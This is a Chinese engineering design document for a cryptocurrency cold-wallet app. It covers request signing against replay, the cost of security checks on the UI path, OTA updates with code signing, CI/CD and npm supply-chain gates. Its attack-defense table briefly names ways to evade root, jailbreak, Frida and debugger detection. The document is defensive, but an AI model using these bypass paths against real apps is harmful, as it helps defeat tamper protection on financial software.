#### 4.5.3 请求防重放：设备绑定 P-256 + RFC 9421 风格

教科书方案「HMAC + nonce + 时间戳」在冷钱包客户端被否决：HMAC 是对称密钥，验证方与签名方共享 secret，客户端一旦被提取（Hermes 明文/SecureStore 被读）即可无限伪造请求；且 iOS Secure Enclave 的原生强项是 P-256 签名而非硬件内 HMAC。MVP 密钥模型：首次启用 API 写功能时 native 生成 **P-256 设备密钥**（iOS Secure Enclave、Android Keystore 优先 StrongBox，私钥不可导出、只暴露 `sign(digest)`），公钥 + deviceId + attestation（App Attest / key attestation）绑定到账户，服务端按 keyid 存公钥[^86^][^137^]。请求格式采用 RFC 9421（HTTP Message Signatures）风格：覆盖 `@method/@authority/@path/@query/content-digest` + `created/expires`（60 秒签名窗，±30 秒时钟偏移）+ `nonce`（128-bit，服务端 `SET NX EX` 原子去重）+ `keyid`[^138^]；另配业务层 `Idempotency-Key`（UUIDv7）——**nonce 防的是传输重放，幂等键防的是副作用重复，二者不互相替代**。服务端验证顺序：格式/大小限制 → 时间窗 → nonce 原子占位 → 重算 content-digest → 按已注册 keyid 取公钥（算法 allowlist 只收 `ecdsa-p256-sha256`）→ 验签；失败统一 401，不泄露失败环节。

**必须区分两层防重放**：

| 层 | 保护对象 | 机制 | 能防 | 不能防 |
|---|---|---|---|---|
| API 请求防重放 | App → 自有后端 | RFC 9421 风格签名 + nonce + 时间窗 + idempotency | 重复调用广播/设备注册/风控确认 API | 不改变链上交易语义 |
| 链上交易防重放 | 钱包 → 区块链 | EOA account nonce + EIP-155 `chainId` 编入签名（`v={0,1}+CHAIN_ID*2+35`）[^139^] | 同链重复执行、跨链 replay | 同一 signed raw tx 被多 RPC 重复广播造成的重复记录；也不保护 API endpoint |

分析：两层混为一谈是钱包工程的高频错误——API 层签名做得再严，也挡不住一笔合法签名交易被攻击者拿到 mempool 后向另一条链 replay（这正是 EIP-155 存在的理由）；反过来 EIP-155 也管不了「攻击者截获广播 API 请求重复提交」。EIP-712 同样明确「本标准不包含 replay protection」，应用须自行处理同一签名消息出现两次的语义[^140^]。两套密钥也要分清：API request proof 的 P-256 设备 key 与钱包 secp256k1 私钥是两个体系，不要用设备 key 代替钱包私钥，也不要把助记词派生放进每次 API 请求路径。

### 4.6 性能红线：检测不进热路径

**帧预算**：60fps = 16.67ms，120fps = 8.33ms——安全检测不允许进入每帧路径；首屏路径只读内存缓存布尔值。业界佐证：Bugsnag 2026-03-02 把 root/jailbreak 检测移到后台线程、2026-10-06 进一步移出启动路径并缓存结果——「安全 SDK 不在首屏前同步跑 root 检测」已是 2026 工程共识[^141^]；其 `RootDetector.kt` 实现含固定路径 `File.exists()`、`/system/build.prop` 逐行解析、native 库加载，这类组合在启动路径造成不可预测 I/O[^142^]。

**冷/热路径分级表**：

| 级别 | 检测/操作 | 典型成本 | 放置位置 | MVP 策略 |
|---|---|---:|---|---|
| H0 每帧 | 无 | 0ms | 不允许 | UI 线程只做动画/渲染，不读检测状态文件 |
| H1 热路径 | 读内存布尔值、原子 riskLevel、缓存时间戳 | 纳秒~微秒 | 首屏/敏感 UI 判断 | native 异步写 cache，UI 只读 |
| H2 用户操作前 | 读缓存的 root/jailbreak/debug 状态、签名 key 存在性 | <1ms（缓存命中） | 签名确认前 | 缓存缺失显示「环境检查中」，不重复全量扫描 |
| C1 首帧后立即 | Build tags、调试标志、**签名校验（4.2.a）**、少量固定路径 stat | 亚毫秒~低毫秒 | `runAfterInteractions`/native worker | 只跑最小集合，结果写内存 |
| C2 后台 | build.prop 全文、多 root 路径、`/proc/self/maps` 行扫描 | 数 ms~数十 ms | background worker | 分片、限频、去重、失败不阻塞 |
| C3 昂贵后台 | PackageManager 查询、dyld 遍历、复杂 hook 检测 | 数十 ms+ | idle 后/高风险页面前 | 一次启动最多一次，磁盘缓存 |
| C4 网络 attestation | Play Integrity、App Attest、设备注册 | 网络 RTT，秒级 | onboarding/敏感写前异步预热 | 绝不阻塞首屏，失败按低信任处理 |
| C5 周期检测 | 全量文件 hash、bundle hash 深比对 | 高 CPU/I/O | 充电/空闲低频 | Roadmap，结果只作风险分 |

分析：分级表的工程本质是把「检测的完整性」与「检测的及时性」解耦——热路径（行情、列表、Tab 切换）只消费 H1 级缓存布尔值，任何文件 I/O、maps 扫描、网络 attestation 都发生在首帧之后；完整检测链（C1–C4）挂在登录与签名交易这两个天然有用户等待预期的节点上异步收敛。签名操作本身也要做感知管理：KeyDroid 实测 TEE 签小 payload 约 20ms、Secure Element 约 150ms（0.01MiB 消息），后者已产生可感知停顿——用户点「确认签名」后应立即进入「正在使用设备安全芯片签名」状态，native 签名 + 乐观 UI 消化延迟[^143^]。乐观 UI 的正确粒度：本地签名完成显示「已签名，广播中」；**不要**立即显示「交易成功/余额已扣减」——链上确认、广播接受、服务端风控是三个独立状态。

**60/120fps 支撑栈**：Reanimated 4.7（需 `react-native-worklets` ≥0.12.2；4.x 只支持 New Architecture，版本必须按官方兼容矩阵与锁定的 RN 版本配对，不盲追最新）跑 UI 线程 worklet；FlashList v2（免 `estimatedItemSize`）承载行情长列表[^144^][^145^][^146^]。**RN 120Hz 现状**：iPhone ProMotion 需在 Info.plist 写 `CADisableMinimumFrameDurationOnPhone=true` 才能解锁高于 60Hz 的刷新（iPad Pro 不需要），且 Apple 明确 app **不能强制固定 120Hz**，系统仲裁 10–120Hz 动态切换[^147^]；Android 侧官方路径为 adaptive refresh rate/`Surface.setFrameRate`/`WindowManager` hint，不能假设所有 120Hz 设备默认全速，必须在目标机型用 tracing 实测[^148^]。纪律：安全检测、签名、网络、解析不进任何动画 frame callback。

### 4.7 攻击-防御映射素材表（供第 6 章汇总）

| 攻击向量 | 目标层 | MVP 防御 | Roadmap 防御 | 标注 | 残余风险 / 2026 绕过路径 |
|---|---|---|---|---|---|
| apktool/MT Manager 重打包 + 自签 | 包完整性 | native 签名块自解析 + 证书指纹（4.2.a，免疫 PackageManager hook 类工具） | v3 lineage/多 signer、Play App Signing 双指纹 | [C]（对工具党近似 [P]） | hook open/pread 重定向到 assets 内原包；需 inode 交叉校验抬成本[^96^][^94^] |
| Hermes bundle 篡改（hbctool 改跳转/hermes-decomp 辅助） | JS 逻辑 | bundle SHA-256 自检（4.2.b）+ v2/v3 整包签名联动 | bundle 关键常量与 native 密钥派生污染式耦合 | [C] | 改 bundle 必破坏 v2 签名触发 4.2.a；内存补丁 Hermes 解释器绕静态校验[^91^] |
| 通用 root 隐藏（Magisk DenyList） | 环境 | su 路径/包名/prop 基础向量 | — | [C]（基本过时） | DenyList 原生即绕过[^98^] |
| Shamiko / Zygisk Next / SUSFS（SukiSU） | 环境 | mounts/mountinfo 多源交叉、namespace 失配、SVC errno 抽样、APatch debug_ramdisk 特征（4.2.c） | 行为链检测、内核态痕迹遥测、服务端风控联动 | [C] | LKM 级 SUSFS 对用户态检测接近免疫；承认漏报，fail-closed 保签名材料[^100^] |
| Frida server（默认配置） | 动态插桩 | 端口 27042+D-Bus、maps/fd/线程名扫描（4.2.f） | rwxp 段检测、inline hook 序言字节自检扩展 | [C] | 改端口/Gadget 模式/brida 重编译改名[^109^] |
| Frida Gadget 重打包注入 | 动态插桩 | 签名校验间接收杀（重打包触发 4.2.a） | so 加载白名单、dlopen 审计 | [C] | 不重打包的 root+inject 注入绕签名链 |
| ptrace/gdb/lldb 调试 | 动态分析 | TRACEME self-attach、TracerPid、PT_DENY_ATTACH+sysctl（4.2.e） | 内联 SVC、检测点分散、结果污染化 | [C] | hook ptrace 返回 0；Stalker 定位检测函数（梆梆案例）[^108^][^107^] |
| iOS Dopamine 2.4 Hide Jailbreak | 环境 | ISS + /var/jb/dyld/sysctl 自补（对非隐藏模式有效） | App Attest 服务端验证、行为异常检测 | [C]，隐藏模式客户端必漏 | 「按需不注入」进程级真干净，机制性漏报不可修[^104^] |
| 单点 hook 检测函数（Interceptor 改返回值） | 检测自身 | 检测聚合于混淆 sealed native 模块、无可读 JNI 链 | o-mvll 混淆检测模块、VMP 化裁决函数 | [C] | 逆向定位检测点后 patch；提高定位成本是唯一策略[^105^] |
| 钓鱼站分发改名重打包 APK | 分发 | 本地签名校验兜底 + 官网域名教育 | Developer Verification 注册（身份归因威慑）+ Play Integrity 服务端判定 | 平台限域 [P]（仅 GMS+参与商店）；端上 [C] | 攻击者自注册身份分发；平台不审内容[^117^][^122^] |
| API 请求重放/篡改 | 网络 | RFC 9421 风格 P-256 设备 key 签名 + nonce + 时间窗 + idempotency（4.5.3） | 远程 pin 下发（离线签名验签+防回滚） | [P]（服务端验签成立时） | 设备 key 被提取则降级；Web 端 assurance=low[^138^] |
| MITM（自有 API 域名） | 网络 | 双 SPKI pin fail-closed（4.5.1） | — | [C] | root 设备 hook 校验逻辑可绕；iOS WS 缺口以架构绕行消解[^132^] |
| 跨链/同链交易 replay | 链上 | EIP-155 chainId + account nonce | — | [P]（协议层） | 同一 raw tx 多 RPC 重复广播的记账噪声[^139^] |
| 检测不通过仍强行使用 | 密钥材料 | **fail-closed：检测不过→不派生/不释放签名材料** | 检测信号编码进派生盐值 | **[P]**（唯一） | 依赖不可逆派生设计；检测误报需有用户申诉/降级通道 |

分析：素材表的主读法是纵向看「标注」列——全表只有两行 [P]（fail-closed 密钥释放、EIP-155 协议层防重放、以及条件成立的 API 服务端验签），其余全是 [C]。这不是防御薄弱，而是端上对抗的物理事实：**防御的重心必须放在「让攻击者即使全胜也拿不到钱」**——私钥不出 native、签名材料 fail-closed 释放、用户可感知的交易确认、服务端风控与设备证明——检测层负责把攻击成本定价到「不划算」并输出遥测。第 6 章汇总时，建议以本表的「残余风险」列直接生成威胁台账的 residual risk 字段，逐条对应监控指标（如「maps 扫描命中率」「签名失败率按 root 信号分层」）。

---

## 第5章 热更新与工程化

> 本章回答四个工程问题：OTA 托管用谁、怎么配才不踩雷、发版管线怎么搭、钱包级供应链门禁长什么样。核心结论前置：**安全红线决定成本下限**——EAS 代码签名锁 Production 档 $199/月，这不是可选项，而是冷钱包 OTA 的入场费；若成本不可接受，等价替代是 xprem 自建（签名不受档位限制，仅改 `updates.url`）。

### 5.1 决策论证：EAS Update 托管 vs 自建

**定案：直接用 EAS Update 托管，自建为预案而非首发。**

理由有三。第一，NexVault 目标用户在海外，EAS Update 走全球 edge CDN 分发，亚太/欧美拉取延迟与可用性不需要自建团队操心；自建意味着自己解决边缘分发（CloudFront/R2 预签名 URL 等），3 天原型期与 MVP 期都不该背这个负担。第二，expo-updates 客户端 SDK 已内嵌于 CNG 构建，`eas update` 一条命令即发布，channel/branch/rollout/rollback 模型完整[^149^][^150^]。第三，自建方案全部经过核实，随时可以迁移（见下表）——先把业务跑起来，把「是否自建」变成成本触发的切换动作，而不是立项时的架构赌博。

#### 自建备选对比

| 方案 | 活跃度（2026-10 核实） | 客户端改动 | 代码签名 | 结论 |
|---|---|---|---|---|
| xprem（原 expo-open-ota） | 673★，最近 push 2026-10-11，生产服务 >1M MAU[^9^] | 仅改 `updates.url` + requestHeaders，expo-updates 原生层不变 | 自有私钥签 manifest，**不受 EAS 档位限制** | **首选备选** |
| hot-updater | 1,768★，最近 push 2026-10-14，Hermes bsdiff 增量[^151^] | **替换 expo-updates 客户端 SDK**，需发新二进制 | 支持 | 不推荐 |
| Capgo | 活跃 | 不适用——仅 Capacitor/Ionic 生态，官方明确「RN 留在 EAS」[^152^] | — | 排除 |
| CodePush 托管 | 已随 App Center 于 2025-03-31 退役 | — | — | 排除 |

**分析**：三选一的关键变量不是星数而是**迁移成本的方向性**。xprem 实现的是官方 expo-updates 协议（expo-updates-1 规范），客户端原生层零改动，意味着「EAS → 自建」和「自建 → EAS」是对称操作：改一个 URL 配置、发一个 OTA 即可完成切换，当天可回退，这对冷钱包是最重要的事故保险 [P]。hot-updater 星数更高、功能更全（Web Console、多存储适配器、bsdiff 增量），但它要求替换客户端 SDK——替换动作本身必须走商店发新二进制，冷钱包用户升级惰性高，一旦自建服务出问题，回退路径同样是「发新二进制过审」，故障窗口以周计。星数更高反而更危险，这是典型的「社区热度 ≠ 可回退性」案例。Capgo 是 Capacitor 生态的 EAS 对应物，与 RN 栈无关，直接排除 [P]。CodePush 托管服务 2025-03-31 已退役，任何存量 CodePush 方案都不在讨论范围内。

**迁移触发条件**（写进 runbook）：① 需要代码签名但不接受 Production $199/月；② 监管/合规要求更新流量不出自有基础设施；③ MAU 规模使 EAS 超额费显著高于自建运维成本。三条任一触发即切 xprem，客户端只改 `updates.url`。

另需明确「自建」的真实成本结构：xprem 本身免费（open-core，注意 license 非标准 SPDX），Docker 镜像 / Helm chart / 单 Go 二进制部署，存储走 S3/GCS/R2/MinIO，分发接 CloudFront 或自有 CDN，作者压测单 vCPU 承载 1M MAU、1000 req/s、p95 < 20ms[^9^]——infra 账单极低，真正成本是**人**：可用性值守、证书与私钥的运维（自建后签名私钥的 KMS/轮换流程全部自己负责）、协议升级跟进。EAS 托管买的本质是把这三件事外包给 Expo 团队。因此切换决策的正确问法不是「EAS 多少钱」而是「我们愿意为 OTA 可用性背多少 on-call 成本」；在团队 < 10 人的阶段，答案几乎总是托管。

### 5.2 EAS Update 落地清单

以下逐项给出定案配置，全部经官方文档一手核实。

#### 5.2.1 runtimeVersion = fingerprint（定案）

```json
// app.json
{ "expo": { "runtimeVersion": { "policy": "fingerprint" } } }
```

三种策略对比：fingerprint 策略由 `@expo/fingerprint` 对「所有可能影响原生运行时的输入」算哈希，任何原生层变化自动递增 runtime version，使不兼容更新「extremely unlikely」[^153^]；appVersion 策略要求人工记得 bump 版本号，且存在「本地 version 超前于商店版本时 OTA 不送达旧二进制用户」的坑；nativeVersion 为旧策略。钱包场景选 fingerprint 的理由是**把「人肉记住 bump」变成机器强制**：JS 调用了不存在原生方法的崩启动事故，在指纹门下根本不可能发出去。fingerprint 还是 §5.3 热更禁区的自动执法器——原生 diff 一旦进来，runtimeVersion 自动变化，旧二进制收不到这个更新，误发被协议层拦截 [P]。

#### 5.2.2 代码签名（安全红线）

```bash
npx expo-updates codesigning:generate   # 生成 RSA 密钥对 + X.509 证书
eas update --private-key-path ./keys/private-key.pem --branch production
```

机制[^19^]：算法固定 `rsa-v1_5-sha256`（RSASSA-PKCS1-v1_5 + SHA-256），`keyid` 默认 "main"；私钥 `private-key.pem` **本地签名、不出机**，存源码库之外（KMS/密码管理器）；自签名证书内嵌进 native build（信任锚是「证书随商店审核过的二进制下发」，不需要 CA 链）。客户端应用更新前先用内嵌证书验 manifest 签名，再按 manifest 中 hash 校验各 asset，任一失败**拒绝加载**（静默、不崩溃）。官方明确：ISP/CDN/云厂商「甚至 EAS 自己」都无法篡改更新内容 [P]。

**红线条款**：① 私钥离线保管，绝不入源码库与 CI 日志；② 校验失败即拒绝加载，不允许「降级到未签名更新」的开关存在；③ 私钥泄露 = 立即轮换（新密钥对 + 新 `keyid` + **新 runtimeVersion** + 新 build）；④ 证书有效期建议 1 年起，注意过期后旧 build 拒绝一切新更新（已下载的继续可用）。**成本含义（Insight 2）**：代码签名仅 Production/Enterprise 档可用[^19^]——安全需求反推成本下限，留在 EAS 的实际起步价是 $199/月，不是 Free。不想付这笔钱就去 §5.1 的 xprem，签名能力相同。

#### 5.2.3 channel 绑定与秒级回滚

构建时 channel 编进二进制，channel 映射 branch，更新发布到 branch；送达需 platform + runtimeVersion + channel 链路三者精确匹配[^149^]。绑定关系：**一个 eas.json profile 恰好绑一个 channel**（development/preview/production 同名绑定，绝不跨 profile 共享）。发布与回滚命令：

```bash
eas update --branch staging --message "fix: address validation"
eas update:republish --group <good-update-group-id>        # 回滚 = 重发历史更新，秒级
eas update:roll-back-to-embedded --branch production       # 兜底：回到二进制内嵌 bundle
eas update:republish --destination-channel production      # staging 验证过的同一 bundle 提升生产，不重新打包[^150^]
```

注意回滚的现实约束：已下载坏包的用户下次启动才拿到回滚包；启动即崩的坏包靠 expo-updates 的崩溃自动回退内嵌包机制兜底 [P]。因此 release runbook 中必须**预先写好**上一条已知良好 update 的 republish 命令，事故时不现场查 ID。

#### 5.2.4 百分比灰度

EAS 原生支持，无需自建：`eas update --rollout-percentage 10` 发布，`eas update:edit --rollout-percentage N` 随时调，`eas update:revert-update-rollout` 撤销[^149^]。限制：同一 branch 同时只能有一个 rollout。推荐节奏：1%×1h → 10%×4–8h → 50% 过夜 → 100%（业界经验：70–80% 的崩溃回归在 1% 首小时内暴露）。若未来切 xprem 自建，其分流实现是「设备 `EAS-Client-ID` + rollout 专属盐做哈希，确定性分流、无需设备态存储」[^154^]——同一设计可作为任何自研分流层的参考。

#### 5.2.5 首屏规避配置

```json
{ "expo": { "updates": {
  "checkAutomatically": "ON_LOAD",
  "fallbackToCacheTimeout": 0
} } }
```

`fallbackToCacheTimeout` 默认 0（范围 0–300000ms）：启动**立即**加载本地缓存 bundle，后台下载、下次冷启动生效，首屏零阻塞[^155^]。代价是用户「永远落后一次启动」。冷钱包补偿设计：另加「关键更新」通道——manifest `extra` 打标记 + 启动时用 `Updates.checkForUpdateAsync()` / `fetchUpdateAsync()` / `reloadAsync()` 在安全时机（非签名流程中）强制门控；涉及资金逻辑的安全修复走此通道，普通修复不打扰首屏 [P]。注意 `__DEV__` 下运行时 API 会抛错、reload 清空内存态。

#### 5.2.6 体积优化：bsdiff bytecode diffing

SDK 55（2026-02）引入 Hermes 字节码 diffing（bsdiff）为 opt-in，SDK 56（2026-05-21）起**默认开启**，官方公告实测 diff bundle 平均小 58%[^13^]。本项目锁 SDK ≥57，天然享受；除非排障不要 opt-out（`updates.enableBsdiffPatchSupport: false`）。另：SDK 55 起 `eas update` 需要 `--environment` 参数，CI 脚本里写死。

### 5.3 热更禁区判定规则

一句话规则：**改动触到 native 层就必须新 build + 商店审核；fingerprint 策略会自动拦住误发**[^153^][^156^]。

**必须发新版（禁走 OTA）**：
1. 新增/升级/删除原生依赖（带原生代码的 npm 包、pod、aar）；
2. 升级 Expo SDK 或 expo-updates 库本身版本；
3. 新增/修改权限（Info.plist usage descriptions、AndroidManifest permissions）、entitlements；
4. 修改 config plugin 或 app.json 中影响原生构建的字段；
5. runtimeVersion 本身变更（启用/轮换代码签名证书也算——证书属于 runtime）；
6. 应用图标、启动屏等编译进二进制的资源。

**可走 OTA**：JS/TS 逻辑、UI 样式、文案、JS 侧 asset（图片/字体，未变更 asset 自动去重不占带宽[^157^]）、纯 JS 依赖。

执行层面把禁区写进 CI 而非人脑：任何触及 `ios/`、`android/`、`app.config` 原生字段、原生依赖的 diff，CI fingerprint diff gate 直接失败该 OTA 发布 job [P]。

#### iOS 合规边界（一手条款）

- **App Store Review Guidelines 2.5.2**：「Apps should be self-contained in their bundles, and may not … download, install, or execute code which introduces or changes features or functionality of the app…」[^158^]
- **Apple DPLA §3.3.1(B)**（2022-06 重排前即业界惯称的 3.3.2）：允许下载**解释执行**代码（WebKit/JavaScriptCore 运行），三条件——(a) 不改变 App 主要用途、与送审宣称用途一致；(b) 不为其他代码/应用建立商店；(c) 不绕过签名、沙盒等 OS 安全机制。

边界判读：**修 bug、UI 微调、文案、性能优化 = 合规；新增改变主要用途的功能、OTA + 远程开关静默开启送审时未呈现的形态 = 违规**（2017-03 Rollout.io 事件 Apple 曾据此群发警告信）。对冷钱包的特别提示：审核记录显示 OTA + feature flag 组合是重点审查对象，**任何涉及资金/私钥流程的新功能走商店审核，不走 OTA**——这同时是合规要求与本工程「私钥操作只在 native 闭环」架构红线的自然推论 [P]。Google Play 侧：Device and Network Abuse 政策禁止从 Play 以外下载可执行代码，但**明确豁免解释器/虚拟机中运行的代码**，RN 的 JS bundle 属此类[^159^]。

### 5.4 成本表

#### 定价冲突裁决（冲突信息处理）

调研中出现两个错误定价来源（rnpush：Starter $29/10K MAU、Production $99/30K MAU），与 stalliontech/checkthat 的数据冲突。经一手核实 expo.dev/pricing 原文裁决：**stalliontech/checkthat 正确，rnpush 弃用**——rnpush 的表格与正文示例自相矛盾（表格写 $99/30K，正文示例却用 "Production plan … $199.00"）[^160^]。本章全部采用一手核实数据：Free 1K MAU/$0；Starter $19/3K MAU/100 GiB；Production $199/50K MAU/1 TiB；超额 MAU $0.005/个、带宽 $0.10/GiB；MAU 口径 = 计费周期内下载过 ≥1 次更新的唯一设备安装数，超额 MAU 各赠 40 MiB 带宽，未变更 asset 不计带宽[^3^][^157^]。

#### 三档 MAU 成本测算

假设：每月 4 次更新 × 平均 bundle 2 MiB；所有 MAU 均为更新用户（保守）；SDK 56+ bsdiff 默认开启后实际传输约再小 58%（会进一步降低带宽但不改变结论，测算按未缩减计）。

| MAU | 推荐档 | 月费 | MAU 超额 | 带宽超额 | 合计/月 | 合计/年 |
|---|---|---|---|---|---|---|
| 1K | Free | $0 | $0 | $0 | **$0** | $0 |
| 10K | Starter | $19 | 7,000×$0.005 = $35 | $0 | **≈$54** | $648 |
| 100K | Production | $199 | 50,000×$0.005 = $250 | $0 | **≈$449** | $5,388 |

**分析**：三个数字背后有一条反直觉结论——**MAU 超额费主导成本，带宽几乎不触发**。因为每个超额 MAU 赠送 40 MiB 带宽，10K 档带宽需求 78 GiB 远低于 100 GiB 含额 + 273 GiB 赠送；「带宽吃掉几百刀」的场景需要 5MB bundle × 20 次/月的激进节奏才出现，bsdiff 开启后更不可能。档间交叉点约 39K MAU（Starter+超额 vs Production）。但对冷钱包，纯算术结论被安全红线覆盖：**只要需要 EAS 托管代码签名，就直接上 Production $199/月**——这是 Insight 2 的量化表达：安全需求反推成本下限，$199 不是「选了高档」，而是「签名能力的价格」。含构建侧：EAS Build 按构建计费 Android $1（medium）/$2（large）、iOS $2/$4，Free 档 15+15 builds/月够原型期，Production 档含 $225 build credit[^3^][^161^]。

### 5.5 构建层：EAS Build 定案与 Fastlane roadmap

#### 5.5.1 profile 设计（eas.json）

```json
{
  "cli": { "version": ">= 16.0.0", "appVersionSource": "remote" },
  "build": {
    "development":    { "developmentClient": true, "distribution": "internal", "channel": "development" },
    "preview":        { "distribution": "internal", "channel": "preview", "android": { "buildType": "apk" } },
    "production":     { "channel": "production", "autoIncrement": true,
                        "android": { "buildType": "app-bundle" }, "environment": "production" },
    "production-apk": { "extends": "production", "channel": "production",
                        "android": { "buildType": "apk" } }
  },
  "submit": { "production": { "android": { "track": "internal" }, "ios": { "ascAppId": "…" } } }
}
```

要点：① **remote credentials 云托管证书**——EAS 自动管理 Android keystore 与 Apple 证书/profile、自动续期，开发者无需常规接触 Apple Developer Portal[^161^]；钱包红线是**即使托管也必须 `eas credentials` 导出并离线冷备份**——密钥即身份，Developer Verification 时代密钥与开发者身份绑定，丢钥 = 丢分发资格 [P]。② `production-apk` 独立 profile 出官网直链 APK，与商店 AAB **同 channel 同签名密钥**（否则 OTA 覆盖不一致、Android Developer Verification 密钥注册分裂）。③ internal distribution 构建 URL 默认匿名可装，钱包项目应在项目设置关闭匿名访问 [P]。④ `appVersionSource: "remote"` 避免 CI 与本地版本号打架；`autoIncrement` 只动 buildNumber/versionCode。

#### 5.5.2 原型期 EAS Build 定案；Fastlane 列 roadmap

EAS Build 定案理由：证书托管消灭 Mac 依赖与 Ruby 环境；与 expo-updates 有 per-profile channel 一等集成；按构建计费无沉没成本。Fastlane 经历 Google → Mobile Native Foundation 托管动荡后，2025 年底社区维护者接手恢复维护，2026-04 发布 2.233.1（41k+ stars）；其部署层（match/deliver/supply/pilot）成熟稳定，截图层（snapshot/frameit）老化[^162^]。**roadmap 定位**：多渠道上架（Samsung Galaxy Store 等）或商店 metadata/截图自动化需求出现时，引入 `fastlane deliver` 补 EAS Submit 不完整覆盖的 metadata 管理，构建层不动。

#### 5.5.3 「构建层与热更层解耦」原则

- **契约隔离**：runtimeVersion 是两层之间唯一兼容契约（字符串精确匹配）。二进制 = 原生壳（只能经商店+审核更换），热更层 = JS bundle + assets（秒级替换）。fingerprint 让契约自动跟随原生输入变化。
- **故障半径隔离**：OTA 回滚（republish）不动二进制；二进制的不可回滚性不传染 OTA 层。两层各有独立发布节奏、审批门与回滚 runbook。
- **安全含义**：OTA 是绕过商店审核的快速通道，也是攻击面——OTA 管线被劫持 = 直接推恶意 JS 给所有用户（Bybit 式前端注入的自助版）。因此 OTA 发布门禁不低于二进制：staging 验证 → republish 提升、代码签名、生产 channel 发布权限最小化；原生能力（密钥存储、签名）只放二进制层 [P]。

### 5.6 三端 CI/CD 最小流水线

```
PR          → lint + typecheck + unit test（Linux runner，pnpm install --frozen-lockfile；
              安装脚本禁用已由根 .npmrc 的 ignore-scripts=true 覆盖）
              + Socket 扫描 + lockfile diff 审查
push main   → eas update --branch preview（JS-only 变更）
              + npx expo export -p web → eas deploy（preview URL）
tag v*.*.*  → [GitHub environment: production 人工审批门]
              → eas build -p all --profile production --non-interactive --json
              → eas build -p android --profile production-apk（官网直链）
              → eas submit（Play internal track → 人工提升；TestFlight）
              → eas deploy --prod（Web 生产）
              → Slack 通知
```

关键决策：① 官方 `expo/expo-github-action@v8` 在 GHA 中安装 EAS CLI，用 `EXPO_TOKEN` 触发构建/更新[^163^]；② **tag 触发 + GitHub environment 审批门**，绝不每 push 构建（成本+噪声）——environment 的 required reviewers 配置即人工门，钱包项目要求 production environment 至少 2 名 reviewer，且 `EXPO_TOKEN` 只挂在该 environment 的 secrets 上而非 repo 级，未过审批的 job 拿不到凭据 [P]；③ Web 端 `npx expo export -p web`（`web.output: "static"`）产 dist，`eas deploy` 部到 EAS Hosting（Cloudflare Workers 边缘），支持 `--prod`/alias；与移动 release 同一条流水线发布可保证三端版本语义一致[^164^]；④ OTA 发布与二进制发布用同一 tag 但不同 job：JS-only 变更的 patch tag（如 v1.2.3-hotfix.1）只触发 `eas update --branch production`，不触发商店构建——发布动作的成本差异（秒 vs 天）应在流水线拓扑上可见，而不是藏在人脑判断里；⑤ 每个 crash report 打 `updateId / channel / runtimeVersion` 标签，灰度放量决策只看带标签的错误率分位数，不看聚合值；每季度做一次 staging 回滚演练，演练脚本就是 runbook 本身。

#### 版本回滚现实（四面治理）

| 发布面 | 回滚能力 | 现实约束 |
|---|---|---|
| OTA（EAS Update） | **秒级**（republish / roll-back-to-embedded） | 已下载坏包的用户下次启动才生效；启动即崩靠自动回退内嵌包 |
| Google Play 二进制 | **不可回滚** | halt 只停扩散，已装用户滞留坏版本；track 首版不能 halt；versionCode 只能递增，修复永远是新构建[^165^] |
| App Store 二进制 | **不可回滚** | phased release 固定 1/2/5/10/20/50/100 七天节奏，只能 pause（累计 30 天），修复 = 更高 build number 重新过审[^165^] |
| Web（EAS Hosting） | 真回滚 | 重新部署上一版本即可 |

**分析**：这张表决定了发布纪律的形状。四个发布面里只有 OTA 和 Web 有真回滚，商店二进制是 forward-fix only——「a shipped binary cannot be un-shipped」。因此商店发布必须 staged rollout 兜底：Play 手动 1→10→50→100%、iOS 七天 phased，让「不可回滚」的伤害半径随放量阶梯展开，而不是一次 100%。OTA 层则反向利用其秒级回滚：凡 JS 可修的线上事故，第一反应是 republish 而不是等新二进制过审——商店的审核周期（小时~天）与 OTA（秒级）差 4–5 个数量级，这就是 §5.5.3 解耦原则买的东西。但反过来，OTA 修复必须受 §5.3 禁区约束：试图用 OTA 修 native 层问题不仅技术上不送达，还会制造出「以为修了实际没修」的假安全感，这比没修更危险。

#### 官网 APK 直链分发合规

截至 2026-10-14，Android Developer Verification 第一阶段（2026-09-30 生效）仅覆盖巴西/印尼/新加坡/泰国 7 家 participating stores 分发的应用，**官网直链 APK 获阶段性豁免**（Google FAQ 明示）；但 **2027 年全球扩展将覆盖所有安装路径含 APK 文件**，届时未注册开发者的 APK 只能走 ADB 或 advanced flow（开发者选项 + 24 小时等待 + 多步警告），普通用户安装转化率崩塌式下降[^118^]。行动项（半天工作量，建议立即做）：已有 Play Console 账号 → 直接在 Android developer verification 页注册官网分发包名；`eas credentials` 取 keystore SHA-256 提交；放 `assets/adi-registration.properties` challenge 构建同密钥验证 APK 上传（不需要生产包）；注册后同密钥后续构建无需重复证明。纪律：官网 APK 与 Play 版共用 EAS remote keystore [P]。

### 5.7 供应链红线：钱包级依赖准入门禁

#### 五条基线配置

1. **`.npmrc`: `ignore-scripts=true` + `allow-git=none` + `min-release-age=7d`**（≥7 天冷静期，与 AGENTS.md R4 门禁口径一致）——Shai-Hulud、Nx s1ngularity、axios RAT 全部经 postinstall 执行；min-release-age 冷却期正好覆盖「恶意包常在 2 小时内被撤但仍被自动工具摄入」的投毒窗口[^166^]。
2. **lockfile 钉版 + CI 一律 `pnpm install --frozen-lockfile`**（禁现场解析版本；`--ignore-scripts` 已由根 `.npmrc` 的 `ignore-scripts=true` 全局覆盖）；密钥/签名/网络相关依赖 `package.json` 用精确版本不用 `^`。
3. **Socket 扫描**（行为分析：install 脚本/网络请求/混淆代码），能在 CVE 出现前拦投毒包，GitHub App 拦 PR——对钱包项目是最关键的一层；`npm audit`（pnpm 工作流下等价命令为 `pnpm audit`，扫描工具而非安装命令）只作已知 CVE 免费基线，识别不了恶意包。
4. 新依赖准入：周下载量/维护者数（bus factor）人工审查 → `npm view <pkg> scripts` 查 install 钩子 → 关键包 `npm pack` 后 diff tarball vs GitHub 源码。
5. **provenance/sigstore 只作参考信号，不作充分条件** [C]。

#### 案例论证

| 事件 | 时间 | 损失/影响 | 对本工程的教训 |
|---|---|---|---|
| Qix/chalk-debug 投毒 | 2025-09 | 18 包（周下载 20 亿+），payload 劫持 fetch/XHR/window.ethereum **重写加密货币钱包地址**，存活约 2 小时[^167^] | 投毒目标就是钱包用户；min-release-age 直接覆盖 2 小时窗口 |
| Shai-Hulud / Mini Shai-Hulud | 2025-09 / 2026-05 | 首个 npm 自传播蠕虫；Mini 版产出**带有效 SLSA L3 provenance 的恶意包**（GHA cache 投毒 + OIDC token 窃取）[^168^] | provenance 只能证明「哪条流水线产的」，不能证明流水线没被劫持——流水线被劫持时下游验证静默失效 |
